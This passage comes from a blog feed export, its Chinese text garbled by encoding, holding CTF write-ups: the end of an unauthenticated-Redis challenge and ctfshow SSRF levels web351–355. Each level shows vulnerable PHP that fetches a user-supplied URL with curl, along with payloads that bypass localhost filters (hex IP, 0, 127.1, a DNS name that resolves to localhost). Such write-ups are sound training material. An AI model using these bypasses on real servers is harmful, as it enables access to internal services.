class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">l</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">p</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">x</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">y</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">n</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">u</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">u</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">t</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">w</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">e</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">R</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">G</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">A</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">L</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">F</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">  flag += c</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag[::-<span class="number">1</span>].replace(<span class="string">&quot;1$&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><p>ç»“æœåœ¨å»é™¤æœ€åä¸‰ä¸ªå­—ç¬¦ <code>35*</code> å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;Redis without authentication is easy to exploit&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶ç”Ÿäº§ç¯å¢ƒåˆ©ç”¨èµ·æ¥ç›¸å¯¹å›°éš¾ï¼Œä¸è¿‡æ¯•ç«Ÿæ˜¯CTFå˜›ï¼Œéªšæ€è·¯å¤šä¸€ä¸ªæ˜¯ä¸€ä¸ª ï¼ˆ</p><hr><p>å‚è€ƒé“¾æ¥</p><div class="note link green"><p><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/">https://skysec.top/2018/08/17/xss-ssrf-redis/</a></p></div>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> hackme </category>
          
          <category> ctfç»ƒä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctfç»ƒä¹  </tag>
            
            <tag> hackme </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow SSRFç¯‡</title>
      <link href="2021/04/25/ctfshow-ssrf/"/>
      <url>2021/04/25/ctfshow-ssrf/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>è¦æ˜¯å¤šç‚¹ç»„åˆæ‹³ï¼Œæˆ–è€…æ¡ä»¶è‹›åˆ»äº›å°±å¥½äº† ï¼ˆ</p><h2 id="web351-ç®€å•è®¤è¯†"><a href="#web351-ç®€å•è®¤è¯†" class="headerlink" title="web351 ç®€å•è®¤è¯†"></a>web351 ç®€å•è®¤è¯†</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># POST</span><br><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617686456106-a9e92005-8b62-4ded-9302-9d144c9360b5.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617686456106-a9e92005-8b62-4ded-9302-9d144c9360b5.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web352-æ°¸è¿œç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å³å°†å‘ç”Ÿ"><a href="#web352-æ°¸è¿œç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å³å°†å‘ç”Ÿ" class="headerlink" title="web352 æ°¸è¿œç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å³å°†å‘ç”Ÿ"></a>web352 æ°¸è¿œç›¸ä¿¡ç¾å¥½çš„äº‹æƒ…å³å°†å‘ç”Ÿ</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>åè®®å¿…é¡»æ˜¯ http/https ï¼Œä½†è¿‡æ»¤äº† localhost å’Œ 127.0.0</p><p>poc</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>preg_match æ²¡ä¼ å‚å¯è¿˜è¡Œã€‚ã€‚å› ä¸ºæœ‰ <code>error_reporting(0)</code> ï¼ŒæŠ¥é”™çš„åœ°æ–¹æ’ä¸º <code>False</code>â€¦</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617687502281-623a00b3-dea2-4ba0-aad8-670551a0adc4.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617687502281-623a00b3-dea2-4ba0-aad8-670551a0adc4.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web353-æ•°å­—ç»•è¿‡"><a href="#web353-æ•°å­—ç»•è¿‡" class="headerlink" title="web353 æ•°å­—ç»•è¿‡"></a>web353 æ•°å­—ç»•è¿‡</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/localhost|127\.0\.|\ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>åè®®å¿…é¡»æ˜¯ http/https ï¼Œä½†è¿‡æ»¤äº† localhost å’Œ 127.0.</p><p>è¿™é‡Œæœ‰è®¸å¤šç»•è¿‡</p><ul><li>è¿›åˆ¶ç»•è¿‡</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://0x7F000001/flag.php</span><br></pre></td></tr></table></figure><ul><li>0.0.0.0 ç»•è¿‡</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://0.0.0.0/flag.php</span><br></pre></td></tr></table></figure><ul><li>ipv6ç»•è¿‡ è¿™é‡Œä¸è¡Œ</li><li>ç‰¹æ®Šåœ°å€ç»•è¿‡</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url=http://0/flag.php</span><br><span class="line">url=http://127.1/flag.php</span><br><span class="line">url=http://127.0000000000000.001/flag.php</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªå°çŸ¥è¯†ç‚¹</p><p>ç¬¬ä¸€ä¸ª 0 åœ¨linuxç³»ç»Ÿä¸­ä¸€èˆ¬ä¼šè§£ææˆ127.0.0.1 ï¼Œåœ¨windows å’Œ macos ä¸­ä¸€èˆ¬è§£ææˆ0.0.0.0</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617687776689-331d0512-b6ec-428d-ba38-f578dcc3d472.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617687776689-331d0512-b6ec-428d-ba38-f578dcc3d472.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web354-éš¾ç‚¹çš„æ•°å­—ç»•è¿‡"><a href="#web354-éš¾ç‚¹çš„æ•°å­—ç»•è¿‡" class="headerlink" title="web354 éš¾ç‚¹çš„æ•°å­—ç»•è¿‡"></a>web354 éš¾ç‚¹çš„æ•°å­—ç»•è¿‡</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/localhost|1|0|ã€‚/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>äº†è§£åˆ°ä¸€ä¸ªå¥½ç©çš„ä¸œè¥¿ <code>IDNA</code> ï¼Œä¸è¿‡è¿™é¢˜ç”¨ä¸ä¸Š</p><p><a href="https://www.tr0y.wang/2020/08/18/IDN/">https://www.tr0y.wang/2020/08/18/IDN/</a></p><p>ç„¶ååˆäº†è§£åˆ°ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œ æœ‰å…è´¹çš„ <code>http://sudo.cc/</code> å¯ä»¥è§£æåˆ° <code>127.0.0.1</code> ç™½å«–ã€‚</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617689750925-02749ca5-8401-4a6c-80d0-985a7ae52fba.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617689750925-02749ca5-8401-4a6c-80d0-985a7ae52fba.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>é¢˜å¤–ï¼š</p><p>è™½ç„¶ä¹Ÿå¯ä»¥ç”¨è‡ªå·±çš„åŸŸåæˆ–æœåŠ¡å™¨ï¼Œ2333</p><h2 id="web355-é•¿åº¦é™åˆ¶"><a href="#web355-é•¿åº¦é™åˆ¶" class="headerlink" title="web355 é•¿åº¦é™åˆ¶"></a>web355 é•¿åº¦é™åˆ¶</h2><span class='btn'><a class="button"  title='nginx/1.18.0'><i class='fas fa-tag'></i>nginx/1.18.0</a></span> <span class='btn'><a class="button"  title='PHP/7.3.22'><i class='fas fa-tag'></i>PHP/7.3.22</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=parse_url(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>((strlen(<span class="variable">$host</span>)&lt;=<span class="number">5</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=curl_init(<span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸»æœºåéƒ¨åˆ†é•¿åº¦é™åˆ¶ï¼Œå¯ä»¥ç”¨ <code>http://0/flag.php</code> ä¹Ÿå¯ä»¥ç”¨ <code>http://127.1/flag.php</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619319893905-9fd4c027-5875-429c-9667-abbf5e164392.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619319893905-9fd4c027-5875-429c-9667-abbf5e164392.png?x-oss-process=image/resize,w_1500" 